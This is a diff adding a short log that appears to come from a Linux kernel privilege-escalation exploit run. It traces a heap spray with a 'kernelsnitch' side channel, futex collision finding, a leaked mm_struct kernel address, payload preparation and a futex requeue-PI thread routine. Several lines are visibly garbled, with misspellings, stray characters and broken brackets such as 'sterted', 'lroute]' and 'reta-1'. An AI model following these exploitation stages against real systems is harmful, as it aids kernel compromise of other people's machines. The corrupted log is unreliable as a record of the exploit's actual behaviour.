@@ -1,0 +1,21 @@
+[*] [spray] mm spray + kernelsnitch
+ready (cpu=8) +154ms
+[*] [spray] finding futex collisions...
++327ms
+[*] [spray] early collision screen 9/7
+at 31%
+[*] [spray] futex collisions found
+4731ms
+[*] [spray] mm_struct
+leaked=0xffffff81b26fbc00 +772ms
+[*] [spray] payload ready +774ms
+[] prepare_kernel_page ok attempt=4
+411623ms
+[] [T+153515ms]heap spray done
+(4] [route] creating waiter/owner/
+consumer
+[的consumer thread running on cpu=4
+oi [routel waiter parked; owner
+sterted
+co1 lroute] CMP_REQUEUE_PI reta-1
+errno-35; waiting route_done
